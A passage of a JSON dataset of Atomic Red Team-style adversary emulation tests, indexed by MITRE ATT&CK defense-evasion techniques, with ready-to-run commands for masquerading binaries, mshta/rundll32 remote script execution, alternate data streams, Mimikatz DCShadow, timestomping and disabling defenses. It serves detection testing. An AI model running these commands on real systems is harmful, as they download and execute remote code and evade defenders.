         "command": "copy \"$env:ComSpec\" ($env:TEMP + \"\\svchost.exe\"); $myT1036_003 = (Start-Process -PassThru -FilePath ($env:TEMP + \"\\svchost.exe\")).Id; Stop-Process -ID $myT1036_003"
      },
      {
         "technique_id": "T1036.003",
         "technique_name": "Masquerading: Rename System Utilities",
         "tactic": "defense-evasion",
         "description": "Copies cscript.exe, renames it, and launches it to masquerade as an instance of notepad.exe.\n\nUpon successful execution, cscript.exe is renamed as notepad.exe and executed from non-standard path.\n",
         "command": "copy %SystemRoot%\\System32\\cscript.exe %APPDATA%\\notepad.exe /Y && cmd.exe /c %APPDATA%\\notepad.exe /B"
      },
      {
         "technique_id": "T1036.003",
         "technique_name": "Masquerading: Rename System Utilities",
         "tactic": "defense-evasion",
         "description": "Copies an exe, renames it as a windows exe, and launches it to masquerade as a real windows exe\n\nUpon successful execution, powershell will execute T1036.003.exe as svchost.exe from on a non-standard path.\n",
         "command": "copy \"1db90b_T1036.003.exe\" ($env:TEMP + \"\\svchost.exe\"); try { $myT1036_003 = (Start-Process -PassThru -FilePath ($env:TEMP + \"\\svchost.exe\")).Id }; catch { $_; exit $_.Exception.HResult}; Stop-Process -ID $myT1036_003"
      },
      {
         "technique_id": "T1036.003",
         "technique_name": "Masquerading: Rename System Utilities",
         "tactic": "defense-evasion",
         "description": "Detect LSM running from an incorrect directory and an incorrect service account\nThis works by copying cmd.exe to a file, naming it lsm.exe, then copying a file to the C:\\ folder.\n\nUpon successful execution, cmd.exe will be renamed as lsm.exe and executed from non-standard path.\n",
         "command": "copy C:\\Windows\\System32\\cmd.exe C:\\lsm.exe && C:\\lsm.exe /c echo T1036.003 > C:\\T1036.003.txt"
      },
      {
         "technique_id": "T1036.003",
         "technique_name": "Masquerading: Rename System Utilities",
         "tactic": "defense-evasion",
         "description": "Copies cmd.exe, renames it, and launches it to masquerade as an instance of lsass.exe.\n\nUpon execution, cmd will be launched by powershell. If using Invoke-AtomicTest, The test will hang until the 120 second timeout cancels the session\n",
         "command": "copy %SystemRoot%\\System32\\cmd.exe %SystemRoot%\\Temp\\lsass.exe && %SystemRoot%\\Temp\\lsass.exe /B"
      },
      {
         "technique_id": "T1036.003",
         "technique_name": "Masquerading: Rename System Utilities",
         "tactic": "defense-evasion",
         "description": "Copies sh process, renames it as crond, and executes it to masquerade as the cron daemon.\n\nUpon successful execution, sh is renamed to `crond` and executed.\n",
         "command": "cp /bin/sh /tmp/crond; echo 'sleep 5' | /tmp/crond"
      },
      {
         "technique_id": "T1036.003",
         "technique_name": "Masquerading: Rename System Utilities",
         "tactic": "defense-evasion",
         "description": "Copies wscript.exe, renames it, and launches it to masquerade as an instance of svchost.exe.\n\nUpon execution, no windows will remain open but wscript will have been renamed to svchost and ran out of the temp folder\n",
         "command": "copy %SystemRoot%\\System32\\wscript.exe %APPDATA%\\svchost.exe /Y && cmd.exe /c %APPDATA%\\svchost.exe \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1036.003\\src\\T1036.003_masquerading.vbs\""
      }
   ],
   "T1218.005": [
      {
         "technique_id": "T1218.005",
         "technique_name": "Signed Binary Proxy Execution: Mshta",
         "tactic": "defense-evasion",
         "description": "Executes an HTA Application using JScript script engine simulating double click.",
         "command": "$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable; if (-not $RequiredModule) {Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force};  ;  Invoke-ATHHTMLApplication -HTAFilePath Test.hta -ScriptEngine JScript -SimulateUserDoubleClick"
      },
      {
         "technique_id": "T1218.005",
         "technique_name": "Signed Binary Proxy Execution: Mshta",
         "tactic": "defense-evasion",
         "description": "Executes an HTA Application with Simulate lateral movement over UNC Path.",
         "command": "$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable; if (-not $RequiredModule) {Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force};  ;  Invoke-ATHHTMLApplication -TemplatePE -AsLocalUNCPath -MSHTAFilePath $env:windir\\system32\\mshta.exe"
      },
      {
         "technique_id": "T1218.005",
         "technique_name": "Signed Binary Proxy Execution: Mshta",
         "tactic": "defense-evasion",
         "description": "Executes an HTA Application with JScript Engine, Rundll32 and Inline Protocol Handler.",
         "command": "$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable; if (-not $RequiredModule) {Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force};  ;  Invoke-ATHHTMLApplication -ScriptEngine JScript -InlineProtocolHandler About -UseRundll32 -Rundll32FilePath $env:windir\\system32\\rundll32.exe"
      },
      {
         "technique_id": "T1218.005",
         "technique_name": "Signed Binary Proxy Execution: Mshta",
         "tactic": "defense-evasion",
         "description": "Use Mshta to execute arbitrary PowerShell. Example is from the 2021 Threat Detection Report by Red Canary.\n",
         "command": "mshta.exe \"about:<hta:application><script language=\"VBScript\">Close(Execute(\"CreateObject(\"\"Wscript.Shell\"\").Run%20\"\"powershell.exe%20-nop%20-Command%20Write-Host%20Hello,%20MSHTA!;Start-Sleep%20-Seconds%205\"\"\"))</script>'\""
      },
      {
         "technique_id": "T1218.005",
         "technique_name": "Signed Binary Proxy Execution: Mshta",
         "tactic": "defense-evasion",
         "description": "Execute an arbitrary remote HTA. Upon execution calc.exe will be launched.\n",
         "command": "$var =Invoke-WebRequest \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.005/src/T1218.005.hta\"; $var.content|out-file \"$env:appdata\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\T1218.005.hta\"; mshta \"$env:appdata\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\T1218.005.hta\"; start-sleep -s 15; stop-process -name \"calculator\" -Force"
      },
      {
         "technique_id": "T1218.005",
         "technique_name": "Signed Binary Proxy Execution: Mshta",
         "tactic": "defense-evasion",
         "description": "Test execution of a remote script using mshta.exe. Upon execution calc.exe will be launched.\n",
         "command": "mshta.exe javascript:a=(GetObject('script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.005/src/mshta.sct')).Exec();close();"
      },
      {
         "technique_id": "T1218.005",
         "technique_name": "Signed Binary Proxy Execution: Mshta",
         "tactic": "defense-evasion",
         "description": "Executes an HTA Application using JScript script engine using local UNC path simulating lateral movement.",
         "command": "$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable; if (-not $RequiredModule) {Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force};  ;  Invoke-ATHHTMLApplication -HTAFilePath Test.hta -ScriptEngine JScript -AsLocalUNCPath -SimulateLateralMovement -MSHTAFilePath $env:windir\\system32\\mshta.exe"
      },
      {
         "technique_id": "T1218.005",
         "technique_name": "Signed Binary Proxy Execution: Mshta",
         "tactic": "defense-evasion",
         "description": "Run a local VB script to run local user enumeration powershell command.\nThis attempts to emulate what FIN7 does with this technique which is using mshta.exe to execute VBScript to execute malicious code on victim systems.\nUpon execution, a new PowerShell windows will be opened that displays user information.\n",
         "command": "mshta vbscript:Execute(\"CreateObject(\"\"Wscript.Shell\"\").Run \"\"powershell -noexit -file PathToAtomicsFolder\\T1218.005\\src\\powershell.ps1\"\":close\")"
      },
      {
         "technique_id": "T1218.005",
         "technique_name": "Signed Binary Proxy Execution: Mshta",
         "tactic": "defense-evasion",
         "description": "Executes an HTA Application with JScript Engine and Inline Protocol Handler.",
         "command": "$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable; if (-not $RequiredModule) {Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force};  ;  Invoke-ATHHTMLApplication -ScriptEngine JScript -InlineProtocolHandler About -MSHTAFilePath $env:windir\\system32\\mshta.exe"
      },
      {
         "technique_id": "T1218.005",
         "technique_name": "Signed Binary Proxy Execution: Mshta",
         "tactic": "defense-evasion",
         "description": "Executes an HTA Application by directly downloading from remote URI.",
         "command": "$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable; if (-not $RequiredModule) {Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force};  ;  Invoke-ATHHTMLApplication -HTAUri https://raw.githubusercontent.com/redcanaryco/atomic-red-team/24549e3866407c3080b95b6afebf78e8acd23352/atomics/T1218.005/src/T1218.005.hta -MSHTAFilePath $env:windir\\system32\\mshta.exe"
      }
   ],
   "T1564.004": [
      {
         "technique_id": "T1564.004",
         "technique_name": "Hide Artifacts: NTFS File Attributes",
         "tactic": "defense-evasion",
         "description": "Storing files in Alternate Data Stream (ADS) similar to Astaroth malware.\nUpon execution cmd will run and attempt to launch desktop.ini. No windows remain open after the test\n",
         "command": "if (!(Test-Path C:\\Users\\Public\\Libraries\\yanki -PathType Container)) {;     New-Item -ItemType Directory -Force -Path C:\\Users\\Public\\Libraries\\yanki;     }; Start-Process -FilePath \"$env:comspec\" -ArgumentList \"/c,type,#{payload_path},>,`\"#{ads_file_path}:#{ads_name}`\"\""
      },
      {
         "technique_id": "T1564.004",
         "technique_name": "Hide Artifacts: NTFS File Attributes",
         "tactic": "defense-evasion",
         "description": "Create an Alternate Data Stream Directory and File with the command prompt. Write access is required. Upon execution, \nrun \"dir /A /Q /R\" in the %temp% folder to view that the alternate data stream folder exists. To view the data in the  \nalternate data stream, run \"type %temp%\\...$.......::$index_allocation\\secrets.txt\"\n",
         "command": "md %temp%\\...$.......::$index_allocation && echo too many secrets > %temp%\\...$.......::$index_allocation\\secrets.txt"
      },
      {
         "technique_id": "T1564.004",
         "technique_name": "Hide Artifacts: NTFS File Attributes",
         "tactic": "defense-evasion",
         "description": "Create an Alternate Data Stream with the command prompt. Write access is required. Upon execution, run \"dir /a-d /s /r | find \":$DATA\"\" in the %temp%\nfolder to view that the alternate data stream exists. To view the data in the alternate data stream, run \"notepad T1564.004_has_ads.txt:adstest.txt\"\n",
         "command": "echo cmd /c echo \"Shell code execution.\"> %temp%\\T1564.004_has_ads_cmd.txt:adstest.txt && for /f \"usebackq delims=?\" %i in (%temp%\\T1564.004_has_ads_cmd.txt:adstest.txt) do %i"
      },
      {
         "technique_id": "T1564.004",
         "technique_name": "Hide Artifacts: NTFS File Attributes",
         "tactic": "defense-evasion",
         "description": "Create an Alternate Data Stream with PowerShell. Write access is required. To verify execution, the the command \"ls -Recurse | %{ gi $_.Fullname -stream *} | where stream -ne ':$Data' | Select-Object pschildname\"\nin the %temp% direcotry to view all files with hidden data streams. To view the data in the alternate data stream, run \"notepad.exe T1564.004_has_ads_powershell.txt:adstest.txt\" in the %temp% folder.\n",
         "command": "echo \"test\" > $env:TEMP\\T1564.004_has_ads_powershell.txt | set-content -path test.txt -stream adstest.txt -value \"test\"; set-content -path $env:TEMP\\T1564.004_has_ads_powershell.txt -stream adstest.txt -value \"test2\"; set-content -path . -stream adstest.txt -value \"test3\""
      },
      {
         "technique_id": "T1564.004",
         "technique_name": "Hide Artifacts: NTFS File Attributes",
         "tactic": "defense-evasion",
         "description": "Execute from Alternate Streams\n\n[Reference - 1](https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f)\n\n[Reference - 2](https://oddvar.moe/2018/01/14/putting-data-in-alternate-data-streams-and-how-to-execute-it/)\n",
         "command": "type C:\\temp\\evil.exe > \"C:\\Program Files (x86)\\TeamViewer\\TeamViewer12_Logfile.log:evil.exe\" && extrac32 c:\\ADS\\\\procexp.cab c:\\ADS\\\\file.txt:procexp.exe && findstr /V /L W3AllLov3DonaldTrump c:\\ADS\\\\procexp.exe > c:\\ADS\\\\file.txt:procexp.exe && certutil.exe -urlcache -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1564.004/src/test.ps1 c:\\temp:ttt && makecab c:\\ADS\\\\autoruns.exe c:\\ADS\\\\cabtest.txt:autoruns.cab && print /D:c:\\ADS\\\\file.txt:autoruns.exe c:\\ADS\\\\Autoruns.exe && reg export HKLM\\SOFTWARE\\Microsoft\\Evilreg c:\\ADS\\\\file.txt:evilreg.reg && regedit /E c:\\ADS\\\\file.txt:regfile.reg HKEY_CURRENT_USER\\MyCustomRegKey && expand \\\\webdav\\folder\\file.bat c:\\ADS\\\\file.txt:file.bat && esentutl.exe /y c:\\ADS\\\\autoruns.exe /d c:\\ADS\\\\file.txt:autoruns.exe /o"
      },
      {
         "technique_id": "T1564.004",
         "technique_name": "Hide Artifacts: NTFS File Attributes",
         "tactic": "lateral-movement",
         "description": "Tool transfer to lateral hosts using Alternate Data Streams to hide implant",
         "command": "esentutl.exe /y #{location} /d \\\\#{remote.host.fqdn}\\c$\\users\\public\\splunk.log:#{exe_name}; invoke-command #{remote.host.fqdn} -scriptblock { wmic process call create \"C:\\users\\public\\splunk.log:#{exe_name} -server #{server} -group red\" }"
      }
   ],
   "T1006": [
      {
         "technique_id": "T1006",
         "technique_name": "Direct Volume Access",
         "tactic": "defense-evasion",
         "description": "This test uses PowerShell to open a handle on the drive volume via the `\\\\.\\` [DOS device path specifier](https://docs.microsoft.com/en-us/dotnet/standard/io/file-path-formats#dos-device-paths) and perform direct access read of the first few bytes of the volume.\nOn success, a hex dump of the first 11 bytes of the volume is displayed.\n\nFor a NTFS volume, it should correspond to the following sequence ([NTFS partition boot sector](https://en.wikipedia.org/wiki/NTFS#Partition_Boot_Sector_(VBR))):\n```\n           00 01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F\n\n00000000   EB 52 90 4E 54 46 53 20 20 20 20                 \u00ebR?NTFS\n```",
         "command": "$buffer = New-Object byte[] 11; $handle = New-Object IO.FileStream \"\\\\.\\C:\", 'Open', 'Read', 'ReadWrite'; $handle.Read($buffer, 0, $buffer.Length); $handle.Close(); Format-Hex -InputObject $buffer"
      }
   ],
   "T1218.011": [
      {
         "technique_id": "T1218.011",
         "technique_name": "Signed Binary Proxy Execution: Rundll32",
         "tactic": "defense-evasion",
         "description": "Test execution of a command using rundll32.exe with advpack.dll.\nReference: https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Advpack.yml\nUpon execution calc.exe will be launched\n",
         "command": "rundll32.exe advpack.dll,LaunchINFSection \"80d0e0_T1218.011.inf\",DefaultInstall_SingleUser,1,"
      },
      {
         "technique_id": "T1218.011",
         "technique_name": "Signed Binary Proxy Execution: Rundll32",
         "tactic": "defense-evasion",
         "description": "Rundll32.exe loading dll using ordinal value #2 to DLLRegisterServer. \nUpon successful execution, Calc.exe will spawn.\n",
         "command": "rundll32.exe \"be0315_AllTheThingsx64.dll\",#2"
      },
      {
         "technique_id": "T1218.011",
         "technique_name": "Signed Binary Proxy Execution: Rundll32",
         "tactic": "defense-evasion",
         "description": "Test execution of a remote script using rundll32.exe. Upon execution notepad.exe will be opened. \nThis has been used by Win32/Poweliks malware and works as described [here](https://www.stormshield.com/news/poweliks-command-line-confusion/)\n\nNote: The GetObject function is no longer supported in Internet Explorer v9 (2011) and later so this technique would only work where very old versions of IE are installed. \n",
         "command": "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.011/src/T1218.011.sct\").Exec();window.close();"
      },
      {
         "technique_id": "T1218.011",
         "technique_name": "Signed Binary Proxy Execution: Rundll32",
         "tactic": "defense-evasion",
         "description": "Test execution of a command using rundll32.exe and VBscript in a similar manner to the JavaScript test.\nTechnique documented by Hexacorn- http://www.hexacorn.com/blog/2019/10/29/rundll32-with-a-vbscript-protocol/\nUpon execution calc.exe will be launched\n",
         "command": "rundll32 vbscript:\"\\..\\mshtml,RunHTMLApplication \"+String(CreateObject(\"WScript.Shell\").Run(\"calc.exe\"),0)"
      },
      {
         "technique_id": "T1218.011",
         "technique_name": "Signed Binary Proxy Execution: Rundll32",
         "tactic": "defense-evasion",
         "description": "Rundll32.exe loading dll with 'control_rundll' within the command-line, loading a .cpl or another file type related to CVE-2021-40444. \n",
         "command": "rundll32.exe shell32.dll,Control_RunDLL \"6349c0_calc.dll\""
      },
      {
         "technique_id": "T1218.011",
         "technique_name": "Signed Binary Proxy Execution: Rundll32",
         "tactic": "defense-evasion",
         "description": "IcedID uses this TTP as follows:\n  rundll32.exe url.dll,OpenURL %PUBLIC%\\index.hta\nTrickbot uses this TTP as follows:\n  rundll32.exe URL.dll,FileProtocolHandler C:\\\\..\\\\Detail\\\\akteullen.vbs\n\nIn this atomic, the sample hta file opens the calculator and the vbs file shows a message dialog with \"rundll32 spawned wscript\"\n",
         "command": "rundll32.exe url.dll,OpenURL \"PathToAtomicsFolder\\T1218.011\\src\\index.hta\" && rundll32.exe URL.dll,FileProtocolHandler \"PathToAtomicsFolder\\T1218.011\\src\\akteullen.vbs\""
      },
      {
         "technique_id": "T1218.011",
         "technique_name": "Signed Binary Proxy Execution: Rundll32",
         "tactic": "defense-evasion",
         "description": "Test execution of a command using rundll32.exe and VBscript in a similar manner to the JavaScript test.\nTechnique documented by Hexacorn- http://www.hexacorn.com/blog/2019/10/29/rundll32-with-a-vbscript-protocol/\nUpon execution calc.exe will be launched\n",
         "command": "rundll32 vbscript:\"\\..\\mshtml,#135 \"+String(CreateObject(\"WScript.Shell\").Run(\"calc.exe\"),0)"
      },
      {
         "technique_id": "T1218.011",
         "technique_name": "Signed Binary Proxy Execution: Rundll32",
         "tactic": "defense-evasion",
         "description": "Rundll32.exe running non-dll \n",
         "command": "rundll32.exe C:\\Users\\$env:username\\Downloads\\calc.png, StartW"
      },
      {
         "technique_id": "T1218.011",
         "technique_name": "Signed Binary Proxy Execution: Rundll32",
         "tactic": "defense-evasion",
         "description": "Executes the LaunchApplication function in pcwutl.dll to proxy execution of an executable.\n",
         "command": "rundll32.exe pcwutl.dll,LaunchApplication %windir%\\System32\\notepad.exe"
      },
      {
         "technique_id": "T1218.011",
         "technique_name": "Signed Binary Proxy Execution: Rundll32",
         "tactic": "defense-evasion",
         "description": "Test execution of a command using rundll32.exe with syssetup.dll. Upon execution, a window saying \"installation failed\" will be opened\n\nReference: https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Syssetup.yml\n",
         "command": "rundll32.exe syssetup.dll,SetupInfObjectInstallAction DefaultInstall 128 \"4c870d_T1218.011_DefaultInstall.inf\""
      },
      {
         "technique_id": "T1218.011",
         "technique_name": "Signed Binary Proxy Execution: Rundll32",
         "tactic": "defense-evasion",
         "description": "Test execution of a command using rundll32.exe with ieadvpack.dll.\nUpon execution calc.exe will be launched\n\nReference: https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Ieadvpack.yml\n",
         "command": "rundll32.exe ieadvpack.dll,LaunchINFSection \"80d0e0_T1218.011.inf\",DefaultInstall_SingleUser,1,"
      },
      {
         "technique_id": "T1218.011",
         "technique_name": "Signed Binary Proxy Execution: Rundll32",
         "tactic": "defense-evasion",
         "description": "Rundll32.exe loading an executable renamed as .scr using desk.cpl \nReference: \n  - [LOLBAS - Libraries/Desk](https://lolbas-project.github.io/lolbas/Libraries/Desk/)\nSIGMA rules:\n  - [SCR File Write Event](https://github.com/SigmaHQ/sigma/blob/b53f08b081e0a50099be9b9e8eced82097fdbaf2/rules/windows/file_event/file_event_win_new_src_file.yml)\n  - [Rundll32 InstallScreenSaver Execution](https://github.com/SigmaHQ/sigma/blob/b53f08b081e0a50099be9b9e8eced82097fdbaf2/rules/windows/process_creation/proc_creation_win_lolbin_rundll32_installscreensaver.yml)\n",
         "command": "copy %windir%\\System32\\calc.exe not_an_scr.scr && rundll32.exe desk.cpl,InstallScreenSaver not_an_scr.scr"
      },
      {
         "technique_id": "T1218.011",
         "technique_name": "Signed Binary Proxy Execution: Rundll32",
         "tactic": "defense-evasion",
         "description": "Test execution of a command using rundll32.exe with setupapi.dll. Upon execution, a windows saying \"installation failed\" will be opened\n\nReference: https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Setupapi.yml\n",
         "command": "rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 128 \"4c870d_T1218.011_DefaultInstall.inf\""
      }
   ],
   "T1207": [
      {
         "technique_id": "T1207",
         "technique_name": "Rogue Domain Controller",
         "tactic": "defense-evasion",
         "description": "Use Mimikatz DCShadow method to simulate behavior of an Active Directory Domain Controller and edit protected attribute.\n\n[DCShadow](https://www.dcshadow.com/)\n[Additional Reference](http://www.labofapenetrationtester.com/2018/04/dcshadow.html)\n\nIt will set the badPwdCount attribute of the target user (user/machine account) to 9999. You can check after with:\nGet-ADObject -LDAPFilter '(samaccountname=<user>)' -Properties badpwdcount | select-object -ExpandProperty badpwdcount\n\nNeed SYSTEM privileges locally (automatically obtained via PsExec, so running as admin is sufficient), and Domain Admin remotely.\nThe easiest is to run elevated and as a Domain Admin user.\n",
         "command": "$dc_output_file = \"PathToAtomicsFolder\\..\\ExternalPayloads\\art-T1207-mimikatz-DC.log\"; Remove-Item $dc_output_file -ErrorAction Ignore; $mimikatzParam =\"`\"log $dc_output_file`\" `\"lsadump::dcshadow /object:#{object} /attribute:#{attribute} /value:#{value}`\" `\"exit`\"\"; $dc = Start-Process -FilePath cmd.exe -Verb Runas -ArgumentList \"/c '#{psexec_path}' /accepteula -d -s #{mimikatz_path} $mimikatzParam\"; Start-Sleep -Seconds 5; & \"#{mimikatz_path}\" \"lsadump::dcshadow /push\" \"exit\"; Write-Host \"`nWaiting for fake DC server to return\"; Wait-Process $dc; Write-Host \"`nOutput from fake DC server:\"; Get-Content $dc_output_file; Start-Sleep 1; Remove-Item $dc_output_file -ErrorAction Ignore; Write-Host \"End of DCShadow\""
      }
   ],
   "T1027.004": [
      {
         "technique_id": "T1027.004",
         "technique_name": "Obfuscated Files or Information: Compile After Delivery",
         "tactic": "defense-evasion",
         "description": "When C# is compiled dynamically, a .cmdline file will be created as a part of the process. \nCertain processes are not typically observed compiling C# code, but can do so without touching disk. This can be used to unpack a payload for execution.\nThe exe file that will be executed is named as T1027.004_DynamicCompile.exe is contained in the 'bin' folder of this atomic, and the source code to the file is in the 'src' folder.\nUpon execution, the exe will print 'T1027.004 Dynamic Compile'.\n",
         "command": "Invoke-Expression \"C:\\Users\\puma-4\\Desktop\\893687_T1027.004_DynamicCompile.exe\""
      },
      {
         "technique_id": "T1027.004",
         "technique_name": "Obfuscated Files or Information: Compile After Delivery",
         "tactic": "defense-evasion",
         "description": "Compile C# code using csc.exe binary used by .NET\nUpon execution an exe named T1027.004.exe will be placed in the temp folder\n",
         "command": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe /out:C:\\Windows\\Temp\\T1027.004.exe \"af2f1c_calc.cs\""
      },
      {
         "technique_id": "T1027.004",
         "technique_name": "Obfuscated Files or Information: Compile After Delivery",
         "tactic": "defense-evasion",
         "description": "Compile a c file with either gcc or clang on Linux or Macos.\n",
         "command": "if [ -e  e9248b_T1027-004-test.c ]; then : ; else wget https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1027.004/src/T1027-004-test.c -O \"e9248b_T1027-004-test.c\"; fi;  ;  gcc e9248b_T1027-004-test.c && ./a.out; clang e9248b_T1027-004-test.c && ./a.out"
      },
      {
         "technique_id": "T1027.004",
         "technique_name": "Obfuscated Files or Information: Compile After Delivery",
         "tactic": "defense-evasion",
         "description": "Compile a c file with either gcc or clang on Linux or Macos.\n",
         "command": "if [ -e  d7822f_T1027-004-test.cc ]; then : ; else wget https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1027.004/src/T1027-004-test.cc -O d7822f_T1027-004-test.cc; fi;  ;  g++ d7822f_T1027-004-test.cc && ./a.out; clang++ d7822f_T1027-004-test.cc && ./a.out"
      },
      {
         "technique_id": "T1027.004",
         "technique_name": "Obfuscated Files or Information: Compile After Delivery",
         "tactic": "defense-evasion",
         "description": "Compile a c file with either gcc or clang on Linux or Macos.\n",
         "command": "if [ -e  a932ec_T1027-004-test.go ]; then : ; else wget https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1027.004/src/T1027-004-test.go -O a932ec_T1027-004-test.go; fi;  ;  go run a932ec_T1027-004-test.go"
      }
   ],
   "T1070.006": [
      {
         "technique_id": "T1070.006",
         "technique_name": "Indicator Removal on Host: Timestomp",
         "tactic": "defense-evasion",
         "description": "Timestomp kxwn.lock.\n\nSuccessful execution will include the placement of kxwn.lock in #{file_path} and execution of timestomp.ps1 to modify the time of the .lock file. \n\n[Mitre ATT&CK Evals](https://github.com/mitre-attack/attack-arsenal/blob/master/adversary_emulation/APT29/CALDERA_DIY/evals/data/abilities/defensive-evasion/4a2ad84e-a93a-4b2e-b1f0-c354d6a41278.yml)\n",
         "command": "import-module \"C:\\Users\\puma-4\\Desktop\\timestomp.ps1\"; timestomp -dest \"C:\\Users\\puma-4\\Desktop\\kxwn.lock\""
      },
      {
         "technique_id": "T1070.006",
         "technique_name": "Indicator Removal on Host: Timestomp",
         "tactic": "defense-evasion",
         "description": "Modifies the last access timestamp of a specified file. This technique was seen in use by the Stitch RAT.\nTo verify execution, use File Explorer to view the Properties of the file and observe that the Accessed time is the year 1970.\n",
         "command": "Get-ChildItem \"C:\\Users\\puma-4\\Desktop\\T1551.006_timestomp.txt\" | % { $_.LastAccessTime = \"01/01/1970 00:00:00\" }"
      },
      {
         "technique_id": "T1070.006",
         "technique_name": "Indicator Removal on Host: Timestomp",
         "tactic": "defense-evasion",
         "description": "Modifies the file creation timestamp of a specified file. This technique was seen in use by the Stitch RAT.\nTo verify execution, use File Explorer to view the Properties of the file and observe that the Created time is the year 1970.\n",
         "command": "Get-ChildItem \"C:\\Users\\puma-4\\Desktop\\T1551.006_timestomp.txt\" | % { $_.CreationTime = \"01/01/1970 00:00:00\" }"
      },
      {
         "technique_id": "T1070.006",
         "technique_name": "Indicator Removal on Host: Timestomp",
         "tactic": "defense-evasion",
         "description": "Stomps on the create timestamp of a file\n\nSetting the creation timestamp requires changing the system clock and reverting.\nSudo or root privileges are required to change date. Use with caution.\n",
         "command": "NOW=$(date +%m%d%H%M%Y); date 010100001971; touch /tmp/T1070.006-creation.txt; date \"$NOW\"; stat /tmp/T1070.006-creation.txt"
      },
      {
         "technique_id": "T1070.006",
         "technique_name": "Indicator Removal on Host: Timestomp",
         "tactic": "defense-evasion",
         "description": "Modifies the file last modified timestamp of a specified file. This technique was seen in use by the Stitch RAT.\nTo verify execution, use File Explorer to view the Properties of the file and observe that the Modified time is the year 1970.\n",
         "command": "Get-ChildItem \"C:\\Users\\puma-4\\Desktop\\T1551.006_timestomp.txt\" | % { $_.LastWriteTime = \"01/01/1970 00:00:00\" }"
      }
   ],
   "T1562.009": [
      {
         "technique_id": "T1562.009",
         "technique_name": "Impair Defenses: Safe Boot Mode",
         "tactic": "defense-evasion",
         "description": "Allows adversaries to abuse safe mode to disable endpoint defenses that may not start with limited boot",
         "command": "bcdedit /set safeboot network"
      }
   ],
   "T1070.005": [
      {
         "technique_id": "T1070.005",
         "technique_name": "Indicator Removal on Host: Network Share Connection Removal",
         "tactic": "defense-evasion",
         "description": "Removes a Network Share utilizing the command_prompt\n",
         "command": "net share \\\\test\\share /delete"
      },
      {
         "technique_id": "T1070.005",
         "technique_name": "Indicator Removal on Host: Network Share Connection Removal",
         "tactic": "defense-evasion",
         "description": "Administrative shares are hidden network shares created by Microsoft\u2019s Windows NT operating systems that grant system administrators \nremote access to every disk volume on a network-connected system. As Microsoft puts it, \u201cMissing administrative shares typically \nindicate that the computer in question has been compromised by malicious software.\nhttps://threatpost.com/conti-ransomware-gang-has-full-log4shell-attack-chain/177173/\n",
         "command": "for %i in (C$ IPC$ ADMIN$) do net share %i /delete"
      },
      {
         "technique_id": "T1070.005",
         "technique_name": "Indicator Removal on Host: Network Share Connection Removal",
         "tactic": "defense-evasion",
         "description": "Add a Network Share utilizing the command_prompt\n",
         "command": "net use c: \\\\test\\share && net share test=\\\\test\\share /REMARK:\"test share\" /CACHE:No"
      },
      {
         "technique_id": "T1070.005",
         "technique_name": "Indicator Removal on Host: Network Share Connection Removal",
         "tactic": "defense-evasion",
         "description": "Removes a Network Share utilizing PowerShell\n",
         "command": "Remove-SmbShare -Name \\\\test\\share; Remove-FileShare -Name \\\\test\\share"
      },
      {
         "technique_id": "T1070.005",
         "technique_name": "Indicator Removal on Host: Network Share Connection Removal",
         "tactic": "defense-evasion",
         "description": "Administrative shares are hidden network shares created by Microsoft\u2019s Windows NT operating systems that grant system administrators \nremote access to every disk volume on a network-connected system. These shares are automatically created at started unless they have been\npurposefully disabled as is done in this Atomic test. As Microsoft puts it, \"Missing administrative shares typically \nindicate that the computer in question has been compromised by malicious software.\"\nhttps://threatpost.com/conti-ransomware-gang-has-full-log4shell-attack-chain/177173/\n",
         "command": "reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters\" /v AutoShareServer /t REG_DWORD /d 0 /f && reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters\" /v AutoShareWks /t REG_DWORD /d 0 /f"
      }
   ],
   "T1564.003": [
      {
         "technique_id": "T1564.003",
         "technique_name": "Hide Artifacts: Hidden Window",
         "tactic": "defense-evasion",
         "description": "The following Atomic Red Team test leverages the Chrome headless browser to access a mockbin site. Create your own Mockbin.org site and replace the BIN in the inputs.\nThe default Mockbin ID forwards to google.com and you may view the details here https://mockbin.org/bin/f6b9a876-a826-4ac0-83b8-639d6ad516ec/view.\nReference: https://cert.gov.ua/article/5702579\n",
         "command": "start \"\" chrome --headless --disable-gpu https://mockbin.org/bin/f6b9a876-a826-4ac0-83b8-639d6ad516ec"
      },
      {
         "technique_id": "T1564.003",
         "technique_name": "Hide Artifacts: Hidden Window",
         "tactic": "defense-evasion",
